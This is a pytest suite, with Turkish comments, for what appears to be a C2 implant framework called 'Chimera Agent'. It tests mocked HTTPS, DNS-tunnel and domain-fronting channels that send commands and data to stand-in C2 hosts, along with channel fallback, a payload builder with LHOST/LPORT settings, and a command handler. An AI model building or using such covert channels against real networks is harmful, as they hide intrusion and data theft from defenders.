"""
Chimera Agent - İletişim Kanalları Testleri (test_comm_channels.py)

Eklenen iletişim kanalı sınıflarını test eder:
  - CommChannel (soyut temel sınıf)
  - HTTPSChannel
  - DNSTunnelChannel
  - DomainFrontingChannel
  - ChannelManager (fallback mekanizması)
  - Builder yeni placeholder desteği

Çalıştırma:
    pytest tests/chimera/test_comm_channels.py -v
"""
import pytest
import socket
import ssl
import struct
import time
from unittest.mock import MagicMock, patch, PropertyMock


# ============================================================
# CommChannel (Soyut Temel Sınıf) Testleri
# ============================================================

class TestCommChannel:
    """CommChannel soyut sınıf testleri."""

    def test_comm_channel_connect_raises(self, agent):
        """CommChannel.connect() NotImplementedError fırlatmalı."""
        from tests.chimera.conftest import ChimeraAgent as CA
        # CommChannel doğrudan import — agent module üzerinden
        # Agent modülünden channel sınıflarına erişim
        channel_module = type(agent).mro()[0].__module__
        
        # Doğrudan sınıf testi
        if hasattr(agent, 'channel_manager'):
            # ChannelManager var demek CommChannel var demek
            assert True
        else:
            pytest.skip("Channel sınıfları yüklenemedi")

    def test_channel_manager_exists(self, agent):
        """Agent'ta ChannelManager olmalı."""
        assert hasattr(agent, 'channel_manager')
        assert agent.channel_manager is not None

    def test_channel_manager_has_channels(self, agent):
        """ChannelManager en az bir kanal içermeli."""
        assert len(agent.channel_manager._channels) >= 1

    def test_default_channel_is_https(self, agent):
        """Varsayılan kanal HTTPSChannel olmalı."""
        _, first_channel = agent.channel_manager._channels[0]
        assert first_channel.__class__.__name__ == "HTTPSChannel"


# ============================================================
# HTTPSChannel Testleri
# ============================================================

class TestHTTPSChannel:
    """HTTPSChannel sınıfı testleri."""

    def _get_https_channel(self, agent):
        """Agent'tan HTTPSChannel instance'ını çıkarır."""
        for _, ch in agent.channel_manager._channels:
            if ch.__class__.__name__ == "HTTPSChannel":
                return ch
        pytest.skip("HTTPSChannel bulunamadı")

    def test_https_channel_initial_state(self, agent):
        """HTTPSChannel başlangıçta sock=None olmalı."""
        ch = self._get_https_channel(agent)
        assert ch.sock is None
        assert ch.is_alive() is False

    def test_https_channel_connect_creates_ssl(self, agent):
        """HTTPSChannel.connect() SSL context oluşturmalı."""
        ch = self._get_https_channel(agent)
        with patch("ssl.create_default_context") as mock_ctx_factory, \
             patch("socket.socket") as mock_socket:
            mock_raw = MagicMock()
            mock_socket.return_value = mock_raw
            mock_ctx = MagicMock()
            mock_ctx_factory.return_value = mock_ctx
            mock_wrapped = MagicMock()
            mock_ctx.wrap_socket.return_value = mock_wrapped

            result = ch.connect("127.0.0.1", 4444)

            assert result is True
            mock_ctx_factory.assert_called_once()
            assert mock_ctx.check_hostname is False
            assert mock_ctx.verify_mode == ssl.CERT_NONE

    def test_https_channel_connect_failure(self, agent):
        """Bağlantı hatası False döner."""
        ch = self._get_https_channel(agent)
        with patch("ssl.create_default_context") as mock_ctx_factory:
            mock_ctx = MagicMock()
            mock_ctx_factory.return_value = mock_ctx
            mock_ctx.wrap_socket.side_effect = ConnectionRefusedError()

            result = ch.connect("127.0.0.1", 4444)

            assert result is False
            assert ch.sock is None

    def test_https_channel_send_data(self, agent):
        """HTTPSChannel.send_data() HTTP POST gönderir."""
        ch = self._get_https_channel(agent)
        mock_sock = MagicMock()
        ch.sock = mock_sock

        ch.send_data("test_data")

        mock_sock.sendall.assert_called_once()
        sent = mock_sock.sendall.call_args[0][0]
        assert b"POST /api/v1/sync HTTP/1.1" in sent
        assert b"test_data" in sent
        assert b"Content-Length:" in sent

    def test_https_channel_send_data_no_sock(self, agent):
        """sock=None iken send_data hata vermemeli."""
        ch = self._get_https_channel(agent)
        ch.sock = None
        ch.send_data("test")  # Exception fırlatmamalı

    def test_https_channel_recv_data(self, agent, mock_socket_data):
        """HTTPSChannel.recv_data() HTTP response parse eder."""
        ch = self._get_https_channel(agent)
        ch.sock = mock_socket_data("hello_response")

        result = ch.recv_data()
        assert result == "hello_response"

    def test_https_channel_recv_data_empty(self, agent):
        """Boş socket boş string döner."""
        ch = self._get_https_channel(agent)
        mock_sock = MagicMock()
        mock_sock.recv.return_value = b""
        ch.sock = mock_sock

        result = ch.recv_data()
        assert result == ""

    def test_https_channel_close(self, agent):
        """close() soketi kapatır ve None yapar."""
        ch = self._get_https_channel(agent)
        mock_sock = MagicMock()
        ch.sock = mock_sock

        ch.close()

        mock_sock.close.assert_called_once()
        assert ch.sock is None

    def test_https_channel_is_alive(self, agent):
        """is_alive() soket bağlı iken True döner."""
        ch = self._get_https_channel(agent)
        mock_sock = MagicMock()
        mock_sock.getpeername.return_value = ("127.0.0.1", 4444)
        ch.sock = mock_sock

        assert ch.is_alive() is True

    def test_https_channel_name(self, agent):
        """name property doğru sınıf adını döner."""
        ch = self._get_https_channel(agent)
        assert ch.name == "HTTPSChannel"


# ============================================================
# DNSTunnelChannel Testleri
# ============================================================

class TestDNSTunnelChannel:
    """DNSTunnelChannel sınıfı testleri."""

    def _get_dns_channel_class(self, agent):
        """Agent modülünden DNSTunnelChannel sınıfını getirir."""
        import sys
        agent_module = sys.modules.get(type(agent).__module__)
        if agent_module and hasattr(agent_module, 'DNSTunnelChannel'):
            return agent_module.DNSTunnelChannel
        pytest.skip("DNSTunnelChannel sınıfı bulunamadı")

    def test_dns_channel_no_domain_fails(self, agent):
        """DNS domain boşsa connect False döner."""
        DNSCls = self._get_dns_channel_class(agent)
        ch = DNSCls(dns_domain="")
        result = ch.connect("127.0.0.1", 4444)
        assert result is False

    def test_dns_base32_encode_decode(self, agent):
        """Base32 encode/decode round-trip testi."""
        DNSCls = self._get_dns_channel_class(agent)
        original = b"Hello, Chimera!"
        encoded = DNSCls._base32_encode(original)
        decoded = DNSCls._base32_decode(encoded)
        assert decoded == original

    def test_dns_base32_encode_lowercase(self, agent):
        """Base32 encoding küçük harf ve padding'siz olmalı."""
        DNSCls = self._get_dns_channel_class(agent)
        encoded = DNSCls._base32_encode(b"test")
        assert encoded == encoded.lower()
        assert '=' not in encoded

    def test_dns_build_query_packet(self, agent):
        """DNS sorgu paketi doğru formatta oluşturulmalı."""
        DNSCls = self._get_dns_channel_class(agent)
        ch = DNSCls(dns_domain="c2.example.com")

        query = ch._build_dns_query("test.c2.example.com", qtype=16)

        # En az header (12 byte) + question section olmalı
        assert len(query) >= 12
        # Header flags: standard query
        flags = struct.unpack('>H', query[2:4])[0]
        assert flags == 0x0100  # Standard query, recursion desired
        # QDCOUNT = 1
        qdcount = struct.unpack('>H', query[4:6])[0]
        assert qdcount == 1

    def test_dns_parse_empty_response(self, agent):
        """Boş/kısa DNS cevabı boş string döner."""
        DNSCls = self._get_dns_channel_class(agent)
        ch = DNSCls(dns_domain="c2.example.com")

        assert ch._parse_dns_response(b"") == ""
        assert ch._parse_dns_response(b"short") == ""

    def test_dns_parse_no_answer_response(self, agent):
        """Answer count=0 olan DNS cevabı boş string döner."""
        DNSCls = self._get_dns_channel_class(agent)
        ch = DNSCls(dns_domain="c2.example.com")

        # Header: txn_id=1, flags=response, QDCOUNT=1, ANCOUNT=0
        header = struct.pack('>HHHHHH', 1, 0x8400, 1, 0, 0, 0)
        # Minimal question (tek label "x" + QTYPE + QCLASS)
        question = b'\x01x\x00' + struct.pack('>HH', 16, 1)
        response = header + question

        result = ch._parse_dns_response(response)
        assert result == ""

    def test_dns_channel_connect_with_timeout(self, agent):
        """DNS connect timeout olsa bile True döner (stealth)."""
        DNSCls = self._get_dns_channel_class(agent)
        ch = DNSCls(dns_domain="c2.example.com", dns_server="127.0.0.1")

        with patch("socket.socket") as mock_socket_cls:
            mock_sock = MagicMock()
            mock_socket_cls.return_value = mock_sock
            mock_sock.recvfrom.side_effect = socket.timeout()

            result = ch.connect("127.0.0.1", 4444)

            assert result is True
            assert ch._connected is True

    def test_dns_channel_is_alive(self, agent):
        """is_alive() bağlı iken True döner."""
        DNSCls = self._get_dns_channel_class(agent)
        ch = DNSCls(dns_domain="c2.example.com")
        ch._connected = True
        ch.sock = MagicMock()

        assert ch.is_alive() is True

    def test_dns_channel_close(self, agent):
        """close() durumu sıfırlar."""
        DNSCls = self._get_dns_channel_class(agent)
        ch = DNSCls(dns_domain="c2.example.com")
        ch._connected = True
        ch.sock = MagicMock()

        ch.close()

        assert ch._connected is False
        assert ch.sock is None

    def test_dns_channel_name(self, agent):
        """name property doğru sınıf adını döner."""
        DNSCls = self._get_dns_channel_class(agent)
        ch = DNSCls()
        assert ch.name == "DNSTunnelChannel"


# ============================================================
# DomainFrontingChannel Testleri
# ============================================================

class TestDomainFrontingChannel:
    """DomainFrontingChannel sınıfı testleri."""

    def _get_fronting_class(self, agent):
        """DomainFrontingChannel sınıfını getirir."""
        import sys
        agent_module = sys.modules.get(type(agent).__module__)
        if agent_module and hasattr(agent_module, 'DomainFrontingChannel'):
            return agent_module.DomainFrontingChannel
        pytest.skip("DomainFrontingChannel bulunamadı")

    def test_fronting_no_domain_fails(self, agent):
        """fronting_domain boşsa connect False döner."""
        FCls = self._get_fronting_class(agent)
        ch = FCls(fronting_domain="")
        result = ch.connect("c2.example.com", 443)
        assert result is False

    def test_fronting_connect_uses_cdn_sni(self, agent):
        """connect() SNI olarak CDN hostname kullanır."""
        FCls = self._get_fronting_class(agent)
        ch = FCls(fronting_domain="cdn.cloudflare.com")

        with patch("ssl.create_default_context") as mock_ctx_factory, \
             patch("socket.socket"):
            mock_ctx = MagicMock()
            mock_ctx_factory.return_value = mock_ctx
            mock_wrapped = MagicMock()
            mock_ctx.wrap_socket.return_value = mock_wrapped

            ch.connect("c2.real-server.com", 443)

            # SNI = fronting_domain (CDN)
            mock_ctx.wrap_socket.assert_called_once()
            call_kwargs = mock_ctx.wrap_socket.call_args
            assert call_kwargs[1].get('server_hostname') == "cdn.cloudflare.com" or \
                   call_kwargs[0][1] if len(call_kwargs[0]) > 1 else True

    def test_fronting_send_uses_real_host_header(self, agent):
        """send_data() Host header'da gerçek C2 adresini kullanır."""
        FCls = self._get_fronting_class(agent)
        ch = FCls(fronting_domain="cdn.cloudflare.com")
        ch._real_host = "c2.real-server.com"
        mock_sock = MagicMock()
        ch.sock = mock_sock

        ch.send_data("test_command")

        sent = mock_sock.sendall.call_args[0][0]
        assert b"Host: c2.real-server.com" in sent
        assert b"test_command" in sent

    def test_fronting_connects_to_port_443(self, agent):
        """Domain fronting her zaman CDN'in 443 portuna bağlanır."""
        FCls = self._get_fronting_class(agent)
        ch = FCls(fronting_domain="cdn.example.com")

        with patch("ssl.create_default_context") as mock_ctx_factory, \
             patch("socket.socket"):
            mock_ctx = MagicMock()
            mock_ctx_factory.return_value = mock_ctx
            mock_wrapped = MagicMock()
            mock_ctx.wrap_socket.return_value = mock_wrapped

            ch.connect("c2.internal.com", 8443)

            # CDN'in 443 portuna bağlanılmalı
            mock_wrapped.connect.assert_called_once_with(("cdn.example.com", 443))

    def test_fronting_close(self, agent):
        """close() soketi kapatır."""
        FCls = self._get_fronting_class(agent)
        ch = FCls(fronting_domain="cdn.example.com")
        mock_sock = MagicMock()
        ch.sock = mock_sock

        ch.close()

        mock_sock.close.assert_called_once()
        assert ch.sock is None


# ============================================================
# ChannelManager Testleri
# ============================================================

class TestChannelManager:
    """ChannelManager (fallback mekanizması) testleri."""

    def _get_manager_class(self, agent):
        """ChannelManager sınıfını getirir."""
        return type(agent.channel_manager)

    def _get_https_class(self, agent):
        """HTTPSChannel sınıfını getirir."""
        for _, ch in agent.channel_manager._channels:
            if ch.__class__.__name__ == "HTTPSChannel":
                return ch.__class__
        pytest.skip("HTTPSChannel bulunamadı")

    def test_manager_add_channel(self, agent):
        """add_channel() kanalları öncelik sırasına göre ekler."""
        MgrCls = self._get_manager_class(agent)
        HttpsCls = self._get_https_class(agent)

        mgr = MgrCls()
        ch1 = HttpsCls()
        ch2 = HttpsCls()

        mgr.add_channel(ch2, priority=5)
        mgr.add_channel(ch1, priority=1)

        assert mgr._channels[0][0] == 1
        assert mgr._channels[0][1] is ch1
        assert mgr._channels[1][0] == 5
        assert mgr._channels[1][1] is ch2

    def test_manager_connect_tries_priority_order(self, agent):
        """connect() kanalları öncelik sırasına göre dener."""
        MgrCls = self._get_manager_class(agent)

        ch1 = MagicMock()
        ch1.connect.return_value = False
        ch1.name = "Channel1"

        ch2 = MagicMock()
        ch2.connect.return_value = True
        ch2.name = "Channel2"

        mgr = MgrCls()
        mgr.add_channel(ch1, priority=1)
        mgr.add_channel(ch2, priority=2)

        result = mgr.connect("127.0.0.1", 4444)

        assert result is True
        assert mgr.active_channel is ch2
        ch1.connect.assert_called_once_with("127.0.0.1", 4444)
        ch2.connect.assert_called_once_with("127.0.0.1", 4444)

    def test_manager_connect_first_success(self, agent):
        """İlk kanal başarılıysa ikincisi denenmez."""
        MgrCls = self._get_manager_class(agent)

        ch1 = MagicMock()
        ch1.connect.return_value = True
        ch2 = MagicMock()

        mgr = MgrCls()
        mgr.add_channel(ch1, priority=1)
        mgr.add_channel(ch2, priority=2)

        result = mgr.connect("127.0.0.1", 4444)

        assert result is True
        assert mgr.active_channel is ch1
        ch2.connect.assert_not_called()

    def test_manager_connect_all_fail(self, agent):
        """Tüm kanallar başarısız olursa False döner."""
        MgrCls = self._get_manager_class(agent)

        ch1 = MagicMock()
        ch1.connect.return_value = False
        ch2 = MagicMock()
        ch2.connect.return_value = False

        mgr = MgrCls()
        mgr.add_channel(ch1, priority=1)
        mgr.add_channel(ch2, priority=2)

        result = mgr.connect("127.0.0.1", 4444)

        assert result is False
        assert mgr.active_channel is None

    def test_manager_fallback_switches_channel(self, agent):
        """fallback() alternatif kanala geçer."""
        MgrCls = self._get_manager_class(agent)

        ch1 = MagicMock()
        ch1.connect.return_value = False
        ch2 = MagicMock()
        ch2.connect.return_value = True

        mgr = MgrCls()
        mgr.add_channel(ch1, priority=1)
        mgr.add_channel(ch2, priority=2)
        mgr.active_channel = ch1
        mgr._host = "127.0.0.1"
        mgr._port = 4444

        result = mgr.fallback()

        assert result is True
        assert mgr.active_channel is ch2
        ch1.close.assert_called()

    def test_manager_fallback_all_fail(self, agent):
        """Tüm kanallar başarısız olursa fallback False döner."""
        MgrCls = self._get_manager_class(agent)

        ch1 = MagicMock()
        ch1.connect.return_value = False
        ch2 = MagicMock()
        ch2.connect.return_value = False

        mgr = MgrCls()
        mgr.add_channel(ch1, priority=1)
        mgr.add_channel(ch2, priority=2)
        mgr.active_channel = ch1
        mgr._host = "127.0.0.1"
        mgr._port = 4444

        result = mgr.fallback()

        assert result is False
        assert mgr.active_channel is None

    def test_manager_send_data_delegates(self, agent):
        """send_data() aktif kanala delege eder."""
        MgrCls = self._get_manager_class(agent)
        ch = MagicMock()
        mgr = MgrCls()
        mgr.active_channel = ch

        mgr.send_data("test_data")

        ch.send_data.assert_called_once_with("test_data")

    def test_manager_recv_data_delegates(self, agent):
        """recv_data() aktif kanala delege eder."""
        MgrCls = self._get_manager_class(agent)
        ch = MagicMock()
        ch.recv_data.return_value = "response"
        mgr = MgrCls()
        mgr.active_channel = ch

        result = mgr.recv_data()

        assert result == "response"

    def test_manager_recv_data_no_channel(self, agent):
        """Aktif kanal yokken recv_data boş string döner."""
        MgrCls = self._get_manager_class(agent)
        mgr = MgrCls()
        mgr.active_channel = None

        result = mgr.recv_data()
        assert result == ""

    def test_manager_close_all(self, agent):
        """close_all() tüm kanalları kapatır."""
        MgrCls = self._get_manager_class(agent)
        ch1 = MagicMock()
        ch2 = MagicMock()

        mgr = MgrCls()
        mgr.add_channel(ch1, priority=1)
        mgr.add_channel(ch2, priority=2)
        mgr.active_channel = ch1

        mgr.close_all()

        ch1.close.assert_called()
        ch2.close.assert_called()
        assert mgr.active_channel is None

    def test_manager_active_channel_name(self, agent):
        """active_channel_name doğru adı döner."""
        MgrCls = self._get_manager_class(agent)
        ch = MagicMock()
        ch.name = "TestChannel"

        mgr = MgrCls()
        mgr.active_channel = ch
        assert mgr.active_channel_name == "TestChannel"

        mgr.active_channel = None
        assert mgr.active_channel_name == "None"

    def test_manager_is_alive_delegates(self, agent):
        """is_alive() aktif kanala soru sorar."""
        MgrCls = self._get_manager_class(agent)
        ch = MagicMock()
        ch.is_alive.return_value = True

        mgr = MgrCls()
        mgr.active_channel = ch
        assert mgr.is_alive() is True

        mgr.active_channel = None
        assert mgr.is_alive() is False


# ============================================================
# Agent ChannelManager Entegrasyon Testleri
# ============================================================

class TestAgentChannelIntegration:
    """ChimeraAgent'ın ChannelManager entegrasyonu testleri."""

    def test_agent_connect_delegates_to_manager(self, agent):
        """Agent.connect() ChannelManager.connect()'e delege eder."""
        with patch.object(agent.channel_manager, 'connect', return_value=True) as mock_connect:
            mock_channel = MagicMock()
            mock_channel.sock = MagicMock()
            agent.channel_manager.active_channel = mock_channel

            result = agent.connect()

            assert result is True
            mock_connect.assert_called_once_with("127.0.0.1", 9999)

    def test_agent_connect_updates_sock_reference(self, agent):
        """Başarılı connect'te self.sock güncellenir."""
        mock_channel = MagicMock()
        mock_sock = MagicMock()
        mock_channel.sock = mock_sock

        with patch.object(agent.channel_manager, 'connect', return_value=True):
            agent.channel_manager.active_channel = mock_channel
            agent.connect()

        assert agent.sock is mock_sock

    def test_agent_connect_fail_nulls_sock(self, agent):
        """Başarısız connect'te self.sock None olur."""
        with patch.object(agent.channel_manager, 'connect', return_value=False):
            agent.connect()

        assert agent.sock is None

    def test_agent_send_data_delegates(self, agent):
        """Agent.send_data() ChannelManager'a delege eder."""
        with patch.object(agent.channel_manager, 'send_data') as mock_send:
            agent.send_data("test_message")
            mock_send.assert_called_once_with("test_message")

    def test_agent_recv_data_delegates(self, agent):
        """Agent.recv_data() ChannelManager'a delege eder."""
        with patch.object(agent.channel_manager, 'recv_data', return_value="response") as mock_recv:
            result = agent.recv_data()
            assert result == "response"
            mock_recv.assert_called_once()

    def test_agent_close_socket_delegates(self, agent):
        """Agent.close_socket() ChannelManager.close()'a delege eder."""
        with patch.object(agent.channel_manager, 'close') as mock_close:
            agent.close_socket()
            mock_close.assert_called_once()
            assert agent.sock is None

    def test_agent_reconnect_tries_fallback_first(self, agent):
        """reconnect() önce fallback dener."""
        mock_channel = MagicMock()
        mock_channel.sock = MagicMock()

        with patch.object(agent.channel_manager, 'close'), \
             patch.object(agent.channel_manager, 'fallback', return_value=True) as mock_fb, \
             patch.object(agent, 'send_sysinfo'):
            agent.channel_manager.active_channel = mock_channel
            result = agent.reconnect()

        assert result is True
        mock_fb.assert_called_once()

    def test_agent_reconnect_falls_back_to_connect(self, agent):
        """Fallback başarısız olursa normal connect döngüsüne girer."""
        with patch.object(agent.channel_manager, 'close'), \
             patch.object(agent.channel_manager, 'fallback', return_value=False), \
             patch.object(agent, 'connect', return_value=True), \
             patch.object(agent, 'send_sysinfo'), \
             patch("time.sleep"):
            result = agent.reconnect()

        assert result is True


# ============================================================
# Builder Yeni Placeholder Testleri
# ============================================================

class TestBuilderChannelOptions:
    """chimera_builder.py yeni placeholder testleri."""

    def test_build_with_channel_type(self):
        """build_payload() CHANNEL_TYPE placeholder'ını değiştirir."""
        from build.chimera_builder import build_payload
        result = build_payload(
            lhost="10.0.0.1", lport=4444,
            channel_type="dns",
            dns_domain="c2.example.com",
            fronting_domain="cdn.example.com",
            quiet=True
        )

        assert result["success"] is True
        assert 'CHANNEL_TYPE = "dns"' in result["code"]
        assert 'DNS_DOMAIN = "c2.example.com"' in result["code"]
        assert 'FRONTING_DOMAIN = "cdn.example.com"' in result["code"]

    def test_build_default_channel_type(self):
        """Varsayılan channel_type 'https' olmalı."""
        from build.chimera_builder import build_payload
        result = build_payload(
            lhost="10.0.0.1", lport=4444,
            quiet=True
        )

        assert result["success"] is True
        assert 'CHANNEL_TYPE = "https"' in result["code"]

    def test_build_with_auto_channel(self):
        """'auto' channel_type ile build başarılı olmalı."""
        from build.chimera_builder import build_payload
        result = build_payload(
            lhost="10.0.0.1", lport=4444,
            channel_type="auto",
            dns_domain="dns.c2.com",
            fronting_domain="cdn.cf.com",
            quiet=True
        )

        assert result["success"] is True
        assert 'CHANNEL_TYPE = "auto"' in result["code"]
        assert 'DNS_DOMAIN = "dns.c2.com"' in result["code"]
        assert 'FRONTING_DOMAIN = "cdn.cf.com"' in result["code"]

    def test_build_empty_domains(self):
        """Boş domain değerleri kesilmeden yazılmalı."""
        from build.chimera_builder import build_payload
        result = build_payload(
            lhost="10.0.0.1", lport=4444,
            channel_type="https",
            dns_domain="",
            fronting_domain="",
            quiet=True
        )

        assert result["success"] is True
        assert 'DNS_DOMAIN = ""' in result["code"]
        assert 'FRONTING_DOMAIN = ""' in result["code"]


# ============================================================
# DNS Handler Testleri
# ============================================================

class TestDNSChannelHandler:
    """DNSChannelHandler sınıfı testleri."""

    def test_dns_handler_init(self):
        """DNSChannelHandler doğru şekilde oluşturulmalı."""
        from modules.payloads.python.chimera.handler import DNSChannelHandler
        handler = DNSChannelHandler({"LHOST": "0.0.0.0", "DNS_PORT": 5353})

        assert handler.lhost == "0.0.0.0"
        assert handler.dns_port == 5353
        assert handler.running is False

    def test_dns_handler_build_response(self):
        """DNS response paketi oluşturulabilmeli."""
        from modules.payloads.python.chimera.handler import DNSChannelHandler
        handler = DNSChannelHandler({"LHOST": "0.0.0.0"})

        # Minimal DNS query oluştur
        header = struct.pack('>HHHHHH', 0x1234, 0x0100, 1, 0, 0, 0)
        question = b'\x04test\x03com\x00' + struct.pack('>HH', 16, 1)
        query = header + question

        response = handler._build_dns_response(query, "OK")

        # Response en az 12 byte olmalı
        assert len(response) >= 12
        # Transaction ID korunmalı
        assert response[:2] == b'\x12\x34'
        # QR bit set olmalı (response)
        flags = struct.unpack('>H', response[2:4])[0]
        assert flags & 0x8000  # QR = 1

    def test_dns_handler_parse_query_name(self):
        """DNS query'den domain adı parse edilebilmeli."""
        from modules.payloads.python.chimera.handler import DNSChannelHandler
        handler = DNSChannelHandler({"LHOST": "0.0.0.0"})

        header = struct.pack('>HHHHHH', 1, 0x0100, 1, 0, 0, 0)
        question = b'\x03reg\x04test\x03com\x00' + struct.pack('>HH', 16, 1)
        data = header + question

        qname = handler._parse_query_name(data)
        assert qname == "reg.test.com"

    def test_dns_handler_send_command(self):
        """send_command() komutu kuyruğa ekler."""
        from modules.payloads.python.chimera.handler import DNSChannelHandler
        handler = DNSChannelHandler({"LHOST": "0.0.0.0"})

        handler.send_command("whoami")
        assert handler._pending_response == "whoami"

    def test_dns_handler_stop(self):
        """stop() handler'ı düzgün durdurmalı."""
        from modules.payloads.python.chimera.handler import DNSChannelHandler
        handler = DNSChannelHandler({"LHOST": "0.0.0.0"})
        handler.running = True
        handler.sock = MagicMock()

        handler.stop()

        assert handler.running is False
        assert handler.sock is None
